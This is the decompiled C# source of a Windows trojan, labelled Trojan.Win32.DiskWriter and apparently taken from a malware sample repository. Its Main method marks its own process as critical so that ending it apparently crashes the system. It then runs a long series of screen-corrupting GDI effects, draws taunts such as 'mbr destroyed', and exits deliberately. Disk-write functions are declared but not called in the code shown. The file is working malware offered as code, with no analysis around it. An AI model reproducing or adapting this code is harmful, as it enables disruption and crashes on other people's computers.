// Decompiled with JetBrains decompiler
// Type: destructive_trojan.Class1
// Assembly: TrojanXD, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FE4F009F-7E0F-44DD-A946-F39237F4D232
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan.Win32.DiskWriter.hrb-30ded1e17972660ebd0af64f5121dc6fdb4e2445714cb890c539eb2897cc0cc2.exe

using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace destructive_trojan
{
  public class Class1
  {
    private const uint GenericRead = 2147483648;
    private const uint GenericWrite = 1073741824;
    private const uint GenericExecute = 536870912;
    private const uint GenericAll = 268435456;
    private const uint FileShareRead = 1;
    private const uint FileShareWrite = 2;
    private const uint OpenExisting = 3;
    private const uint FileFlagDeleteOnClose = 67108864;
    private const uint MbrSize = 512;
    private const int AC_SRC_OVER = 0;
    private const int AC_SRC_ALPHA = 1;
    private Random r;
    private int count = 1000;
    private int x = Screen.PrimaryScreen.Bounds.Width;
    private int y = Screen.PrimaryScreen.Bounds.Height;
    private int left = Screen.PrimaryScreen.Bounds.Left;
    private int top = Screen.PrimaryScreen.Bounds.Top;
    private int right = Screen.PrimaryScreen.Bounds.Right;
    private int bottom = Screen.PrimaryScreen.Bounds.Bottom;
    private bool gdi_text = false;
    private Icon some_ico = Class1.Extract("shell32.dll", 232, true);

    [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
    private static extern int ExtractIconEx(
      string sFile,
      int iIndex,
      out IntPtr piLargeVersion,
      out IntPtr piSmallVersion,
      int amountIcons);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("gdi32.dll", SetLastError = true)]
    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt(
      IntPtr hdc,
      int nXDest,
      int nYDest,
      int nWidth,
      int nHeight,
      IntPtr hdcSrc,
      int nXSrc,
      int nYSrc,
      Class1.TernaryRasterOperations dwRop);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    private static extern bool Rectangle(
      IntPtr hdc,
      int nLeftRect,
      int nTopRect,
      int nRightRect,
      int nBottomRect);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

    [DllImport("User32.dll")]
    private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(int crColor);

    [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
    public static extern bool AlphaBlend(
      IntPtr hdcDest,
      int nXOriginDest,
      int nYOriginDest,
      int nWidthDest,
      int nHeightDest,
      IntPtr hdcSrc,
      int nXOriginSrc,
      int nYOriginSrc,
      int nWidthSrc,
      int nHeightSrc,
      Class1.BLENDFUNCTION blendFunction);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr hdcDest,
      int nXOriginDest,
      int nYOriginDest,
      int nWidthDest,
      int nHeightDest,
      IntPtr hdcSrc,
      int nXOriginSrc,
      int nYOriginSrc,
      int nWidthSrc,
      int nHeightSrc,
      Class1.TernaryRasterOperations dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PlgBlt(
      IntPtr hdcDest,
      Class1.POINT[] lpPoint,
      IntPtr hdcSrc,
      int nXSrc,
      int nYSrc,
      int nWidth,
      int nHeight,
      IntPtr hbmMask,
      int xMask,
      int yMask);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(
      IntPtr hdc,
      int nXLeft,
      int nYLeft,
      int nWidth,
      int nHeight,
      Class1.TernaryRasterOperations dwRop);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr hdc);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
      string lpFileName,
      uint dwDesiredAccess,
      uint dwShareMode,
      IntPtr lpSecurityAttributes,
      uint dwCreationDisposition,
      uint dwFlagsAndAttributes,
      IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
      IntPtr hFile,
      byte[] lpBuffer,
      uint nNumberOfBytesToWrite,
      out uint lpNumberOfBytesWritten,
      IntPtr lpOverlapped);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hHandle);

    public static Icon Extract(string file, int number, bool largeIcon)
    {
      IntPtr piLargeVersion;
      IntPtr piSmallVersion;
      Class1.ExtractIconEx(file, number, out piLargeVersion, out piSmallVersion, 1);
      try
      {
        return Icon.FromHandle(largeIcon ? piLargeVersion : piSmallVersion);
      }
      catch
      {
        return (Icon) null;
      }
    }

    public static void Main()
    {
      int processInformation = 1;
      int processInformationClass = 29;
      Process.EnterDebugMode();
      Class1.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
      new Thread(new ThreadStart(new Class1().GDI_payloads)).Start();
    }

    public void GDI_payloads()
    {
      this.r = new Random();
      IntPtr windowDc1 = Class1.GetWindowDC(Class1.GetDesktopWindow());
      Class1.GetDC(IntPtr.Zero);
      IntPtr solidBrush = Class1.CreateSolidBrush(0);
      Class1.SelectObject(Class1.CreateCompatibleDC(windowDc1), Class1.CreateCompatibleBitmap(windowDc1, this.x, this.y));
      Class1.POINT[] lpPoint = new Class1.POINT[3];
      for (int index = 0; index < 100; ++index)
      {
        IntPtr windowDc2 = Class1.GetWindowDC(Class1.GetDesktopWindow());
        Class1.BitBlt(windowDc2, 0, 0, this.x, this.y, windowDc2, 0, 0, Class1.TernaryRasterOperations.NOTSRCCOPY);
        Class1.DeleteDC(windowDc2);
        if (this.count > 51)
          Thread.Sleep(this.count -= 50);
        else
          Thread.Sleep(50);
      }
      for (int index = 0; index < 300; ++index)
      {
        IntPtr windowDc3 = Class1.GetWindowDC(Class1.GetDesktopWindow());
        Class1.BitBlt(windowDc3, 0, 0, this.x, this.y, windowDc3, 0, 0, Class1.TernaryRasterOperations.NOTSRCCOPY);
        Class1.DeleteDC(windowDc3);
        Point position = Cursor.Position;
        int x = position.X;
        position = Cursor.Position;
        int y = position.Y;
        IntPtr dc = Class1.GetDC(IntPtr.Zero);
        using (Graphics graphics = Graphics.FromHdc(dc))
          graphics.DrawIcon(this.some_ico, x, y);
        Class1.ReleaseDC(IntPtr.Zero, dc);
        Thread.Sleep(50);
      }
      for (int index = 0; index < 500; ++index)
      {
        IntPtr windowDc4 = Class1.GetWindowDC(Class1.GetDesktopWindow());
        Class1.BitBlt(windowDc4, 0, this.r.Next(10), this.r.Next(this.x), this.y, windowDc4, 0, 0, Class1.TernaryRasterOperations.SRCCOPY);
        Class1.DeleteDC(windowDc4);
        if (this.r.Next(30) == 1)
          Class1.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        Thread.Sleep(this.r.Next(25));
      }
      this.clear_screen();
      new Thread(new ThreadStart(this.GDI_payloads2)).Start();
      for (int index = 0; index < 500; ++index)
      {
        IntPtr windowDc5 = Class1.GetWindowDC(Class1.GetDesktopWindow());
        Class1.BitBlt(windowDc5, this.r.Next(-300, this.x), this.r.Next(-300, this.y), this.r.Next(this.x / 2), this.r.Next(this.y / 2), windowDc5, 0, 0, Class1.TernaryRasterOperations.NOTSRCCOPY);
        Class1.DeleteDC(windowDc5);
        Thread.Sleep(50);
      }
      this.clear_screen();
      for (int index = 0; index < 700; ++index)
      {
        if (index < 300)
        {
          IntPtr windowDc6 = Class1.GetWindowDC(Class1.GetDesktopWindow());
          solidBrush = Class1.CreateSolidBrush(this.r.Next(100000000));
          Class1.SelectObject(windowDc6, solidBrush);
          Class1.BitBlt(windowDc6, 0, 0, this.x, this.y, windowDc6, 0, 0, Class1.TernaryRasterOperations.PATINVERT);
          Class1.DeleteObject(solidBrush);
          Class1.DeleteDC(windowDc6);
          Thread.Sleep(50);
        }
        else if (index < 500)
        {
          IntPtr windowDc7 = Class1.GetWindowDC(Class1.GetDesktopWindow());
          solidBrush = Class1.CreateSolidBrush(this.r.Next(100000000));
          Class1.SelectObject(windowDc7, solidBrush);
          Class1.BitBlt(windowDc7, 0, 0, this.x, this.y, windowDc7, 0, 0, Class1.TernaryRasterOperations.PATINVERT);
          Class1.BitBlt(windowDc7, 1, 1, this.x, this.y, windowDc7, 0, 0, Class1.TernaryRasterOperations.SRCERASE);
          Class1.BitBlt(windowDc7, this.r.Next(-300, this.x), this.r.Next(-300, this.y), this.r.Next(this.x / 2), this.r.Next(this.y / 2), windowDc7, 0, 0, Class1.TernaryRasterOperations.NOTSRCCOPY);
          Class1.DeleteObject(solidBrush);
          Class1.DeleteDC(windowDc7);
          Thread.Sleep(50);
        }
        else
        {
          IntPtr windowDc8 = Class1.GetWindowDC(Class1.GetDesktopWindow());
          solidBrush = Class1.CreateSolidBrush(this.r.Next(100000000));
          Class1.SelectObject(windowDc8, solidBrush);
          Class1.BitBlt(windowDc8, 0, 0, this.x, this.y, windowDc8, 0, 0, Class1.TernaryRasterOperations.PATINVERT);
          Class1.BitBlt(windowDc8, 1, 1, this.x, this.y, windowDc8, 0, 0, Class1.TernaryRasterOperations.SRCINVERT);
          Class1.DeleteObject(solidBrush);
          Class1.DeleteDC(windowDc8);
          Thread.Sleep(50);
        }
      }
      this.clear_screen();
      this.gdi_text = true;
      for (int index = 0; index < 500; ++index)
      {
        IntPtr windowDc9 = Class1.GetWindowDC(Class1.GetDesktopWindow());
        lpPoint[0].X = this.left + this.r.Next(25);
        lpPoint[0].Y = this.top + this.r.Next(25);
        lpPoint[1].X = this.right - this.r.Next(25);
        lpPoint[1].Y = this.top;
        lpPoint[2].X = this.left + this.r.Next(25);
        lpPoint[2].Y = this.bottom - this.r.Next(25);
        Class1.PlgBlt(windowDc9, lpPoint, windowDc9, this.left, this.top, this.right - this.left, this.bottom - this.top, IntPtr.Zero, 0, 0);
        IntPtr compatibleDc = Class1.CreateCompatibleDC(windowDc9);
        IntPtr compatibleBitmap = Class1.CreateCompatibleBitmap(windowDc9, this.x, this.y);
        IntPtr hgdiobj = Class1.SelectObject(compatibleDc, compatibleBitmap);
        if (this.r.Next(3) == 1)
          solidBrush = Class1.CreateSolidBrush(100);
        else if (this.r.Next(3) == 2)
          solidBrush = Class1.CreateSolidBrush(100000);
        else if (this.r.Next(3) == 0)
          solidBrush = Class1.CreateSolidBrush(100000000);
        Class1.SelectObject(compatibleDc, solidBrush);
        Class1.Rectangle(compatibleDc, this.left, this.top, this.right, this.bottom);
        Class1.AlphaBlend(windowDc9, 0, 0, this.x, this.y, compatibleDc, 0, 0, this.x, this.y, new Class1.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 10, (byte) 0));
        Class1.SelectObject(compatibleDc, hgdiobj);
        Class1.DeleteObject(compatibleBitmap);
        Class1.DeleteDC(windowDc9);
        Thread.Sleep(10);
      }
      Environment.Exit(-1);
    }

    public void GDI_payloads2()
    {
      Class1.GetWindowDC(Class1.GetDesktopWindow());
      Class1.GetDC(IntPtr.Zero);
      int num = 1000;
      this.r = new Random();
      while (true)
      {
        if (!this.gdi_text)
        {
          IntPtr windowDc = Class1.GetWindowDC(Class1.GetDesktopWindow());
          Class1.BitBlt(windowDc, this.r.Next(20), this.r.Next(20), this.x, this.y, windowDc, 0, 0, Class1.TernaryRasterOperations.SRCCOPY);
          Class1.DeleteDC(windowDc);
          if (num > 51)
            Thread.Sleep(num -= 50);
          else
            Thread.Sleep(5);
        }
        else
        {
          IntPtr dc = Class1.GetDC(IntPtr.Zero);
          using (Graphics graphics = Graphics.FromHdc(dc))
          {
            string[] strArray = new string[5]
            {
              "?Where am I",
              "system is corrupted",
              "th1s is cr4zy",
              "OMG",
              "mbr destroyed"
            };
            Font font = new Font("Arial", (float) this.r.Next(10, 70));
            SolidBrush solidBrush = new SolidBrush(Color.Pink);
            int x = this.r.Next(this.x);
            int y = this.r.Next(this.y);
            StringFormat format = new StringFormat();
            format.FormatFlags = StringFormatFlags.DirectionRightToLeft;
            if (this.r.Next(5) == 0)
              graphics.DrawString(strArray[this.r.Next(4)], font, (Brush) solidBrush, (float) x, (float) y, format);
            Class1.ReleaseDC(IntPtr.Zero, dc);
            Thread.Sleep(5);
          }
        }
      }
    }

    public void clear_screen()
    {
      for (int index = 0; index < 10; ++index)
      {
        Class1.InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        Thread.Sleep(10);
      }
    }

    private enum TernaryRasterOperations : uint
    {
      BLACKNESS = 66, // 0x00000042
      NOTSRCERASE = 1114278, // 0x001100A6
      NOTSRCCOPY = 3342344, // 0x00330008
      SRCERASE = 4457256, // 0x00440328
      DSTINVERT = 5570569, // 0x00550009
      PATINVERT = 5898313, // 0x005A0049
      SRCINVERT = 6684742, // 0x00660046
      SRCAND = 8913094, // 0x008800C6
      MERGEPAINT = 12255782, // 0x00BB0226
      MERGECOPY = 12583114, // 0x00C000CA
      SRCCOPY = 13369376, // 0x00CC0020
      SRCPAINT = 15597702, // 0x00EE0086
      PATCOPY = 15728673, // 0x00F00021
      PATPAINT = 16452105, // 0x00FB0A09
      WHITENESS = 16711778, // 0x00FF0062
      CAPTUREBLT = 1073741824, // 0x40000000
    }

    public struct POINT
    {
      public int X;
      public int Y;

      public POINT(int x, int y)
      {
        this.X = x;
        this.Y = y;
      }

      public static implicit operator Point(Class1.POINT p) => new Point(p.X, p.Y);

      public static implicit operator Class1.POINT(Point p) => new Class1.POINT(p.X, p.Y);
    }

    public struct BLENDFUNCTION
    {
      private byte BlendOp;
      private byte BlendFlags;
      private byte SourceConstantAlpha;
      private byte AlphaFormat;

      public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
      {
        this.BlendOp = op;
        this.BlendFlags = flags;
        this.SourceConstantAlpha = alpha;
        this.AlphaFormat = format;
      }
    }
  }
}
